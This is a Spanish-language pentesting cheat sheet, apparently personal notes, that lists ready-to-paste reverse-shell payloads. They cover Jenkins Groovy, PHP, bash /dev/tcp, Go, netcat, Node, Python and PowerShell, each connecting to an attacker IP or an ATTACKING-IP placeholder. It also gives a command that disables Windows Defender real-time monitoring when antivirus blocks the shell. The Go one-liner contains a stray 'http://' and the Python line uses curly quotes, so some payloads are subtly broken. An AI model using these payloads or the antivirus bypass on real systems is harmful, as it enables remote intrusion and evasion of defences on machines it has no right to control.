### Kali tiene una serie de shells nativas

    /usr/share/webshells/

### Java (jenkins)
conseguir shell inversa desde el script console

    r = Runtime.getRuntime()
    p = r.exec (["/bin/bash","-c","exec 5<>/dev/tcp/10.18.1.100/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()



### PHP

    <?php $sock = fsockopen("10.10.17.146","4444"); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

#### o

    php -r '$sock=fsockopen("10.14.55.255",666);exec("/bin/sh -i <&3 >&3 2>&3");'

### BASH

    0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196

#### o
    exec 5<>/dev/tcp/ATTACKING-IP/80
    cat <&5 | while read line; do $line 2>&5 >&5; done  

#### o

    bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1

### Golang

    echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go

### Netcat

    nc -e /bin/sh ATTACKING-IP 80

###  Node


    require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/80 0>&1');




### PYHON
    
    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.207.168”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);


### POWERSHELL

    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"


Si el antivirus no nos deja crear la shell:
    
    Set-MpPreference -DisableRealtimeMonitoring $true


con esta página podemos crear todo tipo de reverseshells:
    
    https://www.revshells.com/
